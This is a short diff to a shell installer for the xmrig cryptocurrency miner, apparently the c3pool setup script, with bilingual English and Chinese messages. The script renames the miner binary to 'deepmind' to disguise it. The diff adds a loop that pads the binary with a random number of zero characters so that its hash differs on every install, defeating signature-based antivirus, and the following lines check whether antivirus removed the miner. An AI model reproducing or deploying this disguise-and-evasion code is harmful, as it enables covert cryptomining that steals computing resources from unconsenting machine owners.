@@ -218,7 +218,11 @@ if (test $? -ne 0); then
   fi
   rm /tmp/xmrig.tar.gz
   mv $HOME/c3pool/xmrig $HOME/c3pool/deepmind
-  echo "0" >> $HOME/c3pool/deepmind
+  random_number=$((RANDOM % 10086 + 128))
+  for i in $(seq 1 $random_number); do
+    echo -n "0" >> $HOME/c3pool/deepmind
+  done
+
 
   echo "[*] Checking if stock version of $HOME/c3pool/deepmind works fine (and not removed by antivirus software)"
   echo "[*] 检查目录 $HOME/c3pool/deepmind 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
